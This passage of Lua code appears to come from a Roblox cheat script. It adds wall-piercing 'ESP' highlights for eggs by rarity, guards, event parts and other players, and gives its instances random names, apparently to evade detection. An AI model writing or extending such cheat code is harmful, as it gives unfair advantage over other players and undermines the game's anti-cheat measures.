			local tbl25 = { "Any Mutation", "No Mutation" }
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl26 = {}
			local tbl27 = {}

			if type(directory) == "table" then
				for k, v15 in pairs(directory) do
					local rarity = type(v15) == "table" and v15.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						local str = tostring(rarity.DisplayName or rarity._id or flag3)
						tbl26[flag3] = tbl26[flag3] or str

						table.insert(tbl27, {
							Category = tostring(k),
							Name = tostring(v15.DisplayName or k),
							Rarity = flag3,
							RarityName = str,
						})
					end
				end
			end

			local tbl28 = {}

			for k in pairs(tbl26) do
				table.insert(tbl28, k)
			end

			table.sort(tbl28)

			for _, v15 in ipairs(tbl28) do
				local str = string.format("%d - %s", v15, tbl26[v15])
				table.insert(tbl21, str)
				tbl22[str] = v15
			end

			table.sort(tbl27, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v15 in ipairs(tbl27) do
				local str = string.format("%s [%s]", v15.Name, v15.RarityName)

				if tbl24[str] then
					str = string.format("%s [%s] (%s)", v15.Name, v15.RarityName, v15.Category)
				end

				table.insert(tbl23, str)
				tbl24[str] = v15.Category
			end

			local tbl29 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl29, tostring(k))
				end
			end

			table.sort(tbl29)

			for _, v15 in ipairs(tbl29) do
				table.insert(tbl25, v15)
			end

			local function fn15(arg)
				for _, v15 in ipairs(tbl21) do
					if tbl22[v15] == arg then
						return v15
					end
				end

				return tbl21[1]
			end

			espSection:CreateDropdown({
				Name = "ESP Min Rarity",
				Note = "Show eggs of the chosen rarity and every rarity above it",
				Options = tbl21,
				Default = fn15(5),
				SubOf = tbl20.Eggs,
				Callback = function(arg)
					tbl16.MinRarity = tbl22[type(arg) == "table" and arg[1] or arg] or 0
					fn12()
				end,
			})
		end

		fn6(espSection:CreateMultiDropdown({
			Name = "ESP Show Info",
			Options = tbl10,
			Default = tbl11,
			SubOf = tbl20.Eggs,
			Callback = function(arg)
				tbl16.Info = fn14(arg)
				fn12()
			end,
		}))

		do
			local tbl21 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n21 = 0
			local str = "M/s"

			local function fn15(arg, arg2)
				if arg ~= nil then
					n21 = math.max(0, math.floor(tonumber(arg) or n21))
				end

				if arg2 ~= nil then
					str = tostring(arg2)
				end

				tbl16.MinValue = n21 * (tbl21[str] or tbl21["M/s"]).Mult
				fn12()
			end

			fn5(espSection, {
				Name = "Min ESP Value",
				SubOf = tbl20.Eggs,
				Legacy = "ESP Min Value",
				SectionName = "ESP",
				OnRaw = function(arg)
					fn15(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		espSection:CreateSlider({
			Name = "ESP Egg Size",
			Min = 50,
			Max = 200,
			Default = 75,
			Increment = 5,
			Unit = "%",
			SubOf = tbl20.Eggs,
			Callback = function(arg)
				local num = tonumber(arg)

				if num and tbl16.SizeScale ~= num / 100 then
					tbl16.SizeScale = num / 100
					fn13()
				end
			end,
		})

		do
			local n21 = 1
			local n22 = 0.75

			local tbl21 = {
				Sleeping = tbl5.Palettes.Accent,
				Waking = tbl5.Palettes.Gold,
				Chasing = tbl5.Palettes.Red,
			}

			local orange = tbl5.Palettes.Orange
			local tbl22 = {}
			local tbl23 = {}
			local flag3 = false
			local v15 = nil

			local function fn15(arg)
				local attribute = arg:GetAttribute("GuardState")
				if attribute == "Sleeping" then
					return "Sleeping"
				end

				if attribute == "Waking" then
					return "Waking Up"
				end

				if attribute == "Chasing" then
					local attribute2 = arg:GetAttribute("TargetPlayer")
					if attribute2 == tostring(localPlayer.UserId) then
						return "Chasing You"
					end
					local playerByUserId = tonumber(attribute2) and Players:GetPlayerByUserId(tonumber(attribute2))
					return playerByUserId and "Chasing " .. playerByUserId.DisplayName or "Chasing"
				end

				return attribute and tostring(attribute) or "Awake"
			end

			local function fn16(arg, arg2)
				local v16 = tbl21[arg2:GetAttribute("GuardState")] or orange
				arg.Highlight.FillColor = v16.Outline
				arg.Highlight.OutlineColor = v16.Outline
				tbl5.SetRow(arg.StateRow, fn15(arg2), v16)
			end

			local function fn17(arg)
				local floor = math.floor
				arg.Tag.Size = UDim2.fromOffset(tbl5.ScaledWidth(115, n22), floor(tbl5.RowHeight(n22) * 1.6))
			end

			local function fn18(arg)
				local v16 = tbl22[arg]
				if not v16 then
					return
				end
				tbl22[arg] = nil
				tbl5.DisconnectAll(v16.Connections)
				v16.Highlight:Destroy()
				v16.Tag:Destroy()
			end

			local function fn19(arg, adornee)
				if tbl22[adornee] then
					return
				end
				local v16 = tbl5.FindGuardRoot(adornee)
				if not v16 then
					return
				end

				if not v15 or not v15.Parent then
					v15 = tbl5.CreateRuntime()
				end

				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.76
				highlight.OutlineTransparency = 0.02
				highlight.Adornee = adornee
				highlight.Parent = v15
				local ok, result, result2 = pcall(adornee.GetBoundingBox, adornee)
				ok = ok and typeof(result) == "CFrame"
				local n23 = 6

				if ok then
					n23 = result.Position.Y + result2.Y * 0.5 - v16.Position.Y + n21
				end

				local v17, v18 = tbl5.CreateTag(v15, math.huge)
				v17.Adornee = v16
				v17.StudsOffsetWorldSpace = Vector3.new(0, n23, 0)
				local v19 = tbl5.CreateTextRow(v18, tbl5.StatusFont, 1, 0.45)
				local v20 = tbl5.CreateTextRow(v18, tbl5.StatusFont, 2, 0.55)
				local sheen = tbl5.Palettes.Sheen
				tbl5.SetRow(v19, tostring(arg) .. " Guard", sheen)
				local tbl24 = { Highlight = highlight, Tag = v17, StateRow = v20, Connections = {} }
				tbl22[adornee] = tbl24
				fn17(tbl24)
				fn16(tbl24, adornee)

				local function fn20()
					fn16(tbl24, adornee)
				end

				table.insert(tbl24.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(fn20))
				table.insert(tbl24.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(fn20))

				table.insert(tbl24.Connections, adornee.AncestryChanged:Connect(function()
					if not adornee:IsDescendantOf(workspace) then
						fn18(adornee)
					end
				end))
			end

			local function fn20()
				flag3 = false
				tbl5.DisconnectAll(tbl23)

				for k in pairs(tbl22) do
					fn18(k)
				end

				if v15 then
					v15:Destroy()
					v15 = nil
				end
			end

			local function fn21()
				if flag3 then
					return
				end
				flag3 = true
				tbl23 = tbl5.WatchGuards(fn19)
			end

			local v16 = nil
			local flag4 = false
			local flag5 = false

			local function fn22()
				if flag5 then
					return
				end

				if tbl5.ReadToggle(v16, flag4) then
					fn21()
				elseif flag3 then
					fn20()
				end
			end

			fn4(function()
				flag5 = true
				fn20()
			end)

			v16 = espSection:CreateToggle({
				Name = "ESP Guards",
				Default = false,
				Callback = function(arg)
					flag4 = arg == true
					tbl5.SyncSoon(fn22)
				end,
			})

			espSection:CreateSlider({
				Name = "ESP Guard Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v16,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n22 ~= num / 100 then
						n22 = num / 100

						for _, v17 in pairs(tbl22) do
							fn17(v17)
						end
					end
				end,
			})
		end

		do
			local tbl21 = {
				{ Id = "LostPart1", Label = "Mechanical Gear" },
				{ Id = "LostPart2", Label = "Wiring Harness" },
			}

			local v15 = tbl5.PaletteFromColor(Color3.fromRGB(255, 216, 61))
			local accent = tbl5.Palettes.Accent
			local v16 = nil
			local tbl22 = {}
			local flag3 = false
			local connection = nil
			local v17 = nil
			local flag4 = false
			local flag5 = false

			local function fn15(arg)
				local v18 = tbl22[arg]
				if not v18 then
					return
				end
				tbl22[arg] = nil

				pcall(function()
					v18.Highlight:Destroy()
					v18.Tag:Destroy()
				end)
			end

			local function fn16()
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")

				for _, v18 in ipairs(tbl21) do
					local v19 = drScrambleEvent and drScrambleEvent:FindFirstChild(v18.Id)
					local hitbox = v19 and (v19:FindFirstChild("Hitbox", true) or v19.PrimaryPart or v19:FindFirstChildWhichIsA("BasePart", true))
					local tbl23 = tbl22[v18.Id]

					if tbl23 and (tbl23.Model ~= v19 or not hitbox) then
						fn15(v18.Id)
						tbl23 = nil
					end

					if hitbox and not tbl23 then
						if not v16 or not v16.Parent then
							v16 = tbl5.CreateRuntime()
						end

						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.7
						highlight.OutlineTransparency = 0.02
						highlight.Adornee = v19
						highlight.Parent = v16
						local v20, v21 = tbl5.CreateTag(v16, 25000)
						v20.Adornee = hitbox
						v20.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
						local floor = math.floor
						v20.Size = UDim2.fromOffset(tbl5.ScaledWidth(160), floor(tbl5.RowHeight() * 1.6))
						local v22 = tbl5.CreateTextRow(v21, tbl5.StatusFont, 1, 0.5)
						local v23 = tbl5.CreateTextRow(v21, tbl5.StatusFont, 2, 0.5)
						tbl5.SetRow(v22, v18.Label, tbl5.Palettes.Sheen)
						tbl23 = { Model = v19, Hitbox = hitbox, Highlight = highlight, Tag = v20, InfoRow = v23 }
						tbl22[v18.Id] = tbl23
					end

					if tbl23 then
						local flag6 = type(tbl4.ScrambleLostPart) == "function" and tbl4.ScrambleLostPart(v18.Id) == true
						local v20 = flag6 and accent or v15
						tbl5.SetRow(tbl23.InfoRow, flag6 and "Collected" or string.format("%d studs", math.floor(tbl4.DistanceTo(tbl23.Hitbox.Position))), v20)
						tbl23.Highlight.FillColor = v20.Outline
						tbl23.Highlight.OutlineColor = v20.Outline
					end
				end
			end

			local function fn17()
				flag3 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end

				for k in pairs(tbl22) do
					fn15(k)
				end

				if v16 then
					v16:Destroy()
					v16 = nil
				end
			end

			local function fn18()
				if flag3 then
					return
				end
				flag3 = true
				local n21 = 1

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n21 += deltaTime

					if n21 >= 0.3 then
						n21 = 0
						pcall(fn16)
					end
				end)
			end

			local function fn19()
				if flag5 then
					return
				end

				if tbl5.ReadToggle(v17, flag4) then
					fn18()
				elseif flag3 then
					fn17()
				end
			end

			fn4(function()
				flag5 = true
				fn17()
			end)

			v17 = espSection:CreateToggle({
				Name = "ESP Lost Parts",
				Default = false,
				Callback = function(arg)
					flag4 = arg == true
					tbl5.SyncSoon(fn19)
				end,
			})
		end

		local TextService
		TextService = game:GetService("TextService")
		local font
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
		local v15

		do
			local colorSequence = ColorSequence.new
			local tbl21 = {}
			local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
			local v17 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
			tbl21[1] = v16
			tbl21[2] = v17

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
				table.move(values, 1, values.n, 3, tbl21)
			end

			v15 = colorSequence(tbl21)
		end

		local colorSequence

		colorSequence = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
		})

		local flag3
		flag3 = false
		local n21
		n21 = 0
		local v16
		v16 = nil
		local tbl21
		tbl21 = {}
		local tbl22
		tbl22 = {}
		local tbl23
		tbl23 = {}
		local n22, tbl24, v17, flag4, flag5

		do
			local tbl25 = {}
			n22 = 0.75
			tbl24 = { Name = true, Username = false, Avatar = false, Tool = true }
			v17 = nil
			flag4 = false
			flag5 = false

			local function fn15(arg)
				local str = tostring(arg or "")
				if str:match("^%d+$") then
					return "rbxassetid://" .. str
				end
				return str
			end

			local function fn16(arg)
				if not arg or not arg:IsA("Tool") then
					return ""
				end
				local v18 = fn15(arg.TextureId)
				if v18 ~= "" then
					return v18
				end

				for _, v19 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
					local attribute = arg:GetAttribute(v19)
					if type(attribute) == "string" and fn15(attribute) ~= "" then
						return fn15(attribute)
					end
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("Decal") or descendant:IsA("Texture") then
						v18 = fn15(descendant.Texture)
					elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
						v18 = fn15(descendant.Image)
					end

					if v18 ~= "" then
						return v18
					end
				end

				return ""
			end

			local function fn17()
				local currentCamera = workspace.CurrentCamera
				return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n22))
			end

			local function fn18(text, size)
				local str = text .. "@" .. size
				local v18 = tbl25[str]
				if v18 then
					return v18
				end
				local getTextBoundsParams = Instance.new("GetTextBoundsParams")
				getTextBoundsParams.Text = text
				getTextBoundsParams.Font = font
				getTextBoundsParams.Size = size
				getTextBoundsParams.Width = 1000

				local ok, result = pcall(function()
					return TextService:GetTextBoundsAsync(getTextBoundsParams)
				end)

				getTextBoundsParams:Destroy()
				ok = ok and result.X

				if not ok then
					ok = (utf8.len(text) or #text) * size * 0.56
				end

				tbl25[str] = ok
				return ok
			end

			local function fn19(arg, color3, arg2, arg3)
				arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				arg.Color = color3
				arg.LineJoinMode = Enum.LineJoinMode.Round
				arg.Transparency = 0

				arg.Thickness = pcall(function()
					arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
				end) and arg2 or arg3
			end

			local function createTextLabel(parent, zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.AnchorPoint = Vector2.new(0, 0.5)
				textLabel.BackgroundTransparency = 1
				textLabel.FontFace = font
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex
				textLabel.Parent = parent
				return textLabel
			end

			local function createImageLabel(parent, zIndex)
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0, 0.5)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.ZIndex = zIndex
				imageLabel.Parent = parent
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.Parent = imageLabel
				return imageLabel
			end

			local function fn20(arg)
				local v18 = fn17()
				local visible = tbl24.Name == true or tbl24.Username == true
				local visible2 = tbl24.Avatar == true
				local visible3 = tbl24.Tool == true and arg.ToolIcon.Image ~= ""
				local n23 = visible2 and math.floor(v18 * 0.72) or 0
				local n24 = visible3 and math.floor(v18 * 0.82) or 0
				local n25 = math.floor(v18 * 0.7)
				local n26 = math.max(1, math.floor(v18 * 0.04))
				local name = tbl24.Username == true and arg.Player.Name or arg.Player.DisplayName
				arg.Name.Text = name
				arg.Shadow.Text = name
				local n27 = visible and math.floor(math.clamp(fn18(name, n25) + 4, n25, 230)) or 0
				local n28 = 0
				local n29 = 0

				if visible2 then
					n29 = 0 + n23
				end

				local n30 = 0

				if visible then
					if not (n29 > 0) then
						n30 = n29
					else
						n30 = n29 + n26
					end

					n29 = n30 + n27
				end

				local n31 = 0

				if visible3 then
					if n29 > 0 then
						n31 = n29 + n26
					else
						n31 = n29
					end

					n29 = n31 + n24
				end

				local n32 = math.max(n29, 1)
				local n33 = 1 / n32
				local n34 = 1 / v18
				arg.Billboard.Size = UDim2.fromOffset(n32, v18)
				arg.Avatar.Visible = visible2
				arg.Name.Visible = visible
				arg.Shadow.Visible = visible
				arg.ToolIcon.Visible = visible3
				arg.ToolShadow.Visible = visible3
				arg.Avatar.Position = UDim2.fromScale(n28 / n32, 0.5)
				arg.Avatar.Size = UDim2.fromScale(n23 / n32, n23 / v18)
				arg.Name.Position = UDim2.fromScale(n30 / n32, 0.5)
				arg.Name.Size = UDim2.fromScale(n27 / n32, n25 / v18)
				arg.Shadow.Position = UDim2.fromScale(n30 / n32 + n33, 0.5 + n34)
				arg.Shadow.Size = arg.Name.Size
				arg.ToolIcon.Position = UDim2.fromScale(n31 / n32, 0.5)
				arg.ToolIcon.Size = UDim2.fromScale(n24 / n32, n24 / v18)
				arg.ToolShadow.Position = UDim2.fromScale(n31 / n32 + n33, 0.5 + n34)
				arg.ToolShadow.Size = arg.ToolIcon.Size
			end

			local function fn21(arg, adornee, arg2, adornee2)
				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.Adornee = adornee
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillColor = Color3.fromRGB(0, 67, 148)
				highlight.FillTransparency = 0.76
				highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
				highlight.OutlineTransparency = 0.02
				highlight.Parent = v16
				adornee2 = adornee2 or arg2
				local n23 = 3.1

				if adornee2 ~= arg2 then
					n23 = math.clamp(arg2.Position.Y - adornee2.Position.Y + 3.1, 3.8, 6)
				end

				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = fn3()
				billboardGui.Adornee = adornee2
				billboardGui.AlwaysOnTop = true
				billboardGui.LightInfluence = 0
				billboardGui.MaxDistance = math.huge
				billboardGui.Size = UDim2.fromOffset(1, 1)
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, n23, 0)
				billboardGui.Parent = v16
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundTransparency = 1
				frame.Parent = billboardGui
				local v18 = createImageLabel(frame, 2)
				v18.ScaleType = Enum.ScaleType.Crop
				local uiCorner = Instance.new("UICorner")
				uiCorner.Name = fn3()
				uiCorner.CornerRadius = UDim.new(1, 0)
				uiCorner.Parent = v18
				local v19 = createTextLabel(frame, 1)
				v19.TextColor3 = Color3.fromRGB(7, 19, 34)
				v19.TextTransparency = 0.05
				local v20 = createTextLabel(frame, 2)
				v20.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = fn3()
				fn19(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
				uiStroke.Parent = v20
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Name = fn3()
				uiGradient.Color = colorSequence
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Name = fn3()
				uiGradient2.Color = v15
				uiGradient2.Rotation = 90
				uiGradient2.Parent = v20
				local v21 = createImageLabel(frame, 1)
				v21.ImageColor3 = Color3.fromRGB(0, 0, 0)
				v21.ImageTransparency = 0.35

				local tbl26 = {
					Player = arg,
					Highlight = highlight,
					Billboard = billboardGui,
					Avatar = v18,
					Shadow = v19,
					Name = v20,
					ToolShadow = v21,
					ToolIcon = createImageLabel(frame, 2),
				}

				fn20(tbl26)
				return tbl26
			end

			local function fn22(arg)
				if arg.NameHumanoid and arg.NameHumanoid.Parent and arg.NameDistance ~= nil then
					pcall(function()
						arg.NameHumanoid.NameDisplayDistance = arg.NameDistance
					end)
				end

				arg.NameHumanoid = nil
				arg.NameDistance = nil
			end

			local function fn23(arg, arg2)
				local humanoid = arg2 and arg2:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end

				if arg.NameHumanoid ~= humanoid then
					fn22(arg)
					arg.NameHumanoid = humanoid
					arg.NameDistance = humanoid.NameDisplayDistance
				end

				pcall(function()
					humanoid.NameDisplayDistance = 0
				end)
			end

			local function fn24(arg)
				tbl5.DisconnectAll(arg.CharacterConnections)

				if arg.Tag then
					pcall(function()
						arg.Tag.Highlight:Destroy()
					end)

					pcall(function()
						arg.Tag.Billboard:Destroy()
					end)

					arg.Tag = nil
				end

				fn22(arg)
				arg.Character = nil
			end

			local function fn25(arg)
				if not arg.Tag or not arg.Character then
					return
				end
				local v18 = fn16(arg.Character:FindFirstChildOfClass("Tool"))
				arg.Tag.ToolIcon.Image = v18
				arg.Tag.ToolShadow.Image = v18
				fn20(arg.Tag)
			end

			local function fn26(arg, arg2, arg3)
				local image = tbl23[arg2.UserId]

				if image == nil then
					local ok

					ok, image = pcall(function()
						return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end)

					image = ok and image or ""
					tbl23[arg2.UserId] = image
				end

				if flag3 and arg.Version == arg3 and arg.Tag then
					arg.Tag.Avatar.Image = image
				end
			end

			local function fn27(arg, arg2, character)
				fn24(arg)
				arg.Version = arg.Version + 1
				local version = arg.Version
				if not flag3 or not character then
					return
				end
				arg.Character = character

				task.spawn(function()
					local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
					if not flag3 or arg.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
						return
					end

					if not v16 or not v16.Parent then
						v16 = tbl5.CreateRuntime()
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					arg.Tag = fn21(arg2, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
					fn23(arg, character)

					local function fn28()
						task.defer(function()
							if flag3 and arg.Version == version then
								fn25(arg)
							end
						end)
					end

					table.insert(arg.CharacterConnections, character.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							fn28()
						elseif child:IsA("Humanoid") then
							fn23(arg, character)
						end
					end))

					table.insert(arg.CharacterConnections, character.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							fn28()
						end
					end))

					table.insert(arg.CharacterConnections, character.AncestryChanged:Connect(function()
						if arg.Version == version and not character:IsDescendantOf(workspace) then
							arg.Version = arg.Version + 1
							fn24(arg)
						end
					end))

					fn25(arg)
					fn26(arg, arg2, version)
				end)
			end

			local function fn28(player)
				local v18 = tbl21[player]
				if not v18 then
					return
				end
				v18.Version = v18.Version + 1
				fn24(v18)
				tbl5.DisconnectAll(v18.PlayerConnections)
				tbl21[player] = nil
			end

			local function fn29(player)
				if player == localPlayer or tbl21[player] then
					return
				end

				local tbl26 = {
					Version = 0,
					Character = nil,
					Tag = nil,
					NameHumanoid = nil,
					NameDistance = nil,
					CharacterConnections = {},
					PlayerConnections = {},
				}

				tbl21[player] = tbl26

				table.insert(tbl26.PlayerConnections, player.CharacterAdded:Connect(function(character)
					fn27(tbl26, player, character)
				end))

				table.insert(tbl26.PlayerConnections, player.CharacterRemoving:Connect(function(character)
					if tbl26.Character == character then
						tbl26.Version = tbl26.Version + 1
						fn24(tbl26)
					end
				end))

				fn27(tbl26, player, player.Character)
			end

			local function fn30()
				for _, v18 in pairs(tbl21) do
					if v18.Tag then
						fn20(v18.Tag)
					end
				end
			end

			local function fn31()
				flag3 = false
				n21 += 1
				tbl5.DisconnectAll(tbl22)
				local tbl26 = {}

				for k in pairs(tbl21) do
					table.insert(tbl26, k)
				end

				for _, v18 in ipairs(tbl26) do
					fn28(v18)
				end

				if v16 then
					v16:Destroy()
					v16 = nil
				end
			end

			local function fn32()
				if flag3 then
					return
				end
				flag3 = true
				n21 += 1
				local v18 = n21
				v16 = tbl5.CreateRuntime()

				for _, player in ipairs(Players:GetPlayers()) do
					fn29(player)
				end

				table.insert(tbl22, Players.PlayerAdded:Connect(fn29))
				table.insert(tbl22, Players.PlayerRemoving:Connect(fn28))
				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					table.insert(tbl22, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn30))
				end

				task.spawn(function()
					while true do
						if flag3 and v18 == n21 then
							task.wait(1)

							if not (not flag3 or v18 ~= n21) then
								for k, v19 in pairs(tbl21) do
									local character = k.Character
									local adornee = v19.Tag and v19.Tag.Billboard.Parent and v19.Tag.Billboard.Adornee and v19.Tag.Billboard.Adornee:IsDescendantOf(workspace)

									if character and character:IsDescendantOf(workspace) and (v19.Character ~= character or not adornee) then
										fn27(v19, k, character)
									end
								end

								continue
							end
						end

						break
					end
				end)
			end

			local function fn33()
				if flag5 then
					return
				end

				if tbl5.ReadToggle(v17, flag4) then
					fn32()
				elseif flag3 then
					fn31()
				end
			end

			fn4(function()
				flag5 = true
				fn31()
			end)

			v17 = espSection:CreateToggle({
				Name = "ESP Players",
				Default = false,
				Callback = function(arg)
					flag4 = arg == true
					tbl5.SyncSoon(fn33)
				end,
			})

			fn6(espSection:CreateMultiDropdown({
				Name = "ESP Player Info",
				Options = { "Name", "Username", "Avatar", "Tool" },
				Default = { "Name", "Tool" },
				SubOf = v17,
				Callback = function(arg)
					local tbl26 = { Name = false, Username = false, Avatar = false, Tool = false }

					if type(arg) == "table" then
						for k, v18 in pairs(arg) do
							if type(v18) == "string" and tbl26[v18] ~= nil then
								tbl26[v18] = true
							elseif type(k) == "string" and v18 == true and tbl26[k] ~= nil then
								tbl26[k] = true
							end
						end
					end

					tbl24 = tbl26
					fn30()
				end,
			}))

			espSection:CreateSlider({
				Name = "ESP Player Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v17,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n22 ~= num / 100 then
						n22 = math.clamp(num / 100, 0.5, 2)
						fn30()
					end
				end,
			})
		end

		n3 = 3
		n4 = 0.002
		n5 = 4
		tbl7 = { "Value", "Rarity", "Weight", "Distance" }
		n6 = 0.3
		n7 = 0.62
		n8 = 0.86
		n9 = 5.2173913043478262
		n10 = 1.392
		n11 = 1.03
		tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService = game:GetService("TweenService")
		color2 = Color3.fromRGB

		fn8 = function(arg)
			local tbl25 = {}

			for i, v18 in ipairs(arg) do
				tbl25[i] = ColorSequenceKeypoint.new(v18[1], v18[2])
			end

			return ColorSequence.new(tbl25)
		end

		tbl8 = {}

		do
			local hud = {}
			local tbl25 = {}
			local tbl26 = { 0, color2(0, 118, 255) }
			local tbl27 = { 1, color2(72, 204, 255) }
			tbl25[1] = tbl26
			tbl25[2] = tbl27
			hud.Color = fn8(tbl25)
			hud.Rotation = -90
			hud.Stroke = color2(0, 28, 76)
			hud.Light = color2(172, 226, 255)
			tbl8.Hud = hud
		end
	end

	do
		local steal = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(60, 255, 0) }
		local tbl11 = { 1, color2(136, 255, 0) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		steal.Color = fn8(tbl9)
		steal.Rotation = -90
		steal.Stroke = color2(11, 72, 0)
		steal.Light = color2(190, 255, 180)
		tbl8.Steal = steal
	end

	do
		local queued = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(118, 118, 132) }
		local tbl11 = { 1, color2(172, 172, 186) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		queued.Color = fn8(tbl9)
		queued.Rotation = -90
		queued.Stroke = color2(28, 28, 34)
		queued.Light = color2(214, 214, 226)
		tbl8.Queued = queued
	end

	do
		local priorityOn = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(255, 247, 0) }
		local tbl11 = { 1, color2(255, 136, 0) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		priorityOn.Color = fn8(tbl9)
		priorityOn.Rotation = 90
		priorityOn.Stroke = color2(0, 0, 0)
		priorityOn.Light = color2(132, 112, 0)
		tbl8.PriorityOn = priorityOn
	end

	do
		local cancel = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(214, 17, 17) }
		local tbl11 = { 1, color2(253, 20, 20) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		cancel.Color = fn8(tbl9)
		cancel.Rotation = -90
		cancel.Stroke = color2(72, 0, 0)
		cancel.Light = color2(255, 103, 103)
		tbl8.Cancel = cancel
	end

	do
		local chilli = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(132, 74, 255) }
		local tbl11 = { 0.34, color2(178, 74, 255) }
		local tbl12 = { 0.6, color2(255, 104, 206) }
		local tbl13 = { 0.78, color2(255, 168, 232) }
		local tbl14 = { 1, color2(146, 66, 255) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		tbl9[3] = tbl12
		tbl9[4] = tbl13
		tbl9[5] = tbl14
		chilli.Color = fn8(tbl9)
		chilli.Rotation = -115
		chilli.Stroke = color2(44, 10, 80)
		chilli.Light = color2(226, 178, 255)
		tbl8.Chilli = chilli
	end

	local fn9

	do
		local tbl9 = {}
		local tbl10 = { 0, color2(255, 255, 255) }
		local tbl11 = { 0.2, color2(206, 212, 224) }
		local tbl12 = { 0.42, color2(74, 80, 94) }
